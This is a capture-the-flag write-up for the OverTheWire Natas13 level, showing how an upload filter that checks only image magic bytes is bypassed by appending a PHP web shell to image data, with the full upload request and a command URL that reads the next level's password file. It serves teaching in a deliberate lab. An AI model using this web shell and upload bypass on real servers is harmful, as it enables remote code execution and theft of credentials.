# Natas13
#natas #burp-suite #remote-code-execution 
## Vulnerability:
The web application verifies that the uploaded file is valid by checking its **magic bytes** (the first bytes of the file). An attacker can easily place valid image bytes at the start and append a PHP code at the end.
## Technique:
Uploaded an image containing malicious PHP code to achieve remote code execution.
#### Steps:
###### 1) Analyzing the source code
```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters) - 1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir . "/" . genRandomString() . "." . $ext;
    } while (file_exists($path));

    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if (array_key_exists("filename", $_POST)) {

    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err = $_FILES["uploadedfile"]["error"];

    if ($err) {

        if ($err === 2) {
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else {
            echo "Something went wrong :/";
        }

    } else if (filesize($_FILES["uploadedfile"]["tmp_name"]) > 1000) {

        echo "File is too big";

    } else if (!exif_imagetype($_FILES["uploadedfile"]["tmp_name"])) {

        echo "File is not an image";

    } else {

        if (move_uploaded_file(
            $_FILES["uploadedfile"]["tmp_name"],
            $target_path
        )) {

            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";

        } else {

            echo "There was an error uploading the file, please try again!";

        }
    }
}

?>
```
The web application uses `exif_imagetype` to verify that the uploaded file is a valid image. More precisely, `exif_imagetype()` checks the **file signature (magic bytes)** at the beginning of the file.
That means we can provide anything after that signature, and the application will still treat the file as a valid image.
###### 2) Modifying the image content
```http
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
Content-Length: 1300
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Origin: http://natas13.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGxI5LZxdF6uovghi
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas13.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>
Connection: keep-alive

------WebKitFormBoundaryGxI5LZxdF6uovghi
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryGxI5LZxdF6uovghi
Content-Disposition: form-data; name="filename"

x9uomb08b9.php
------WebKitFormBoundaryGxI5LZxdF6uovghi
Content-Disposition: form-data; name="uploadedfile"; filename="1kb.jpg"
Content-Type: image/jpeg

[Raw image data]
<?php system($_GET['cmd']); ?>
```
We added the PHP web shell at the end of the binary image data, and we changed to extension of the file to `php`.

**Result:**
```http
HTTP/1.1 200 OK
Date: Tue, 04 Aug 2026 09:18:49 GMT
Server: Apache/2.4.66 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1041
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas13",
            "pass": "<NATAS12_PASSWORD>"
        };
    </script>
</head>

<body>
    <h1>natas13</h1>

    <div id="content">
        For security reasons, we now only accept image files!
        <br><br>

        The file
        <a href="upload/gbakr9hlj6.php">upload/gbakr9hlj6.php</a>
        has been uploaded

        <div id="viewsource">
            <a href="index-source.html">View sourcecode</a>
        </div>
    </div>
</body>
</html>
```
The file was successfully uploaded.
###### 3) Remote code execution
Same as the previous Level, we'll use a specific URL to retrieve the password for Natas14:
```
http://natas13.natas.labs.overthewire.org/upload/gbakr9hlj6.php?cmd=cat%20/etc/natas_webpass/natas14
```
**Result:**

<img width="1322" height="387" alt="image" src="https://github.com/user-attachments/assets/b8354071-bccd-473a-849d-91303f21f6de" />

> [!NOTE]
> Why did the app print the binary data?
> Because PHP works like this:
>- Anything **outside** `<?php ... ?>` → treated as plain output
>- Anything **inside** `<?php ... ?>` → executed as PHP code 
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas12](./Natas12.md)
## Next Level:
[Natas14](./Natas14.md)
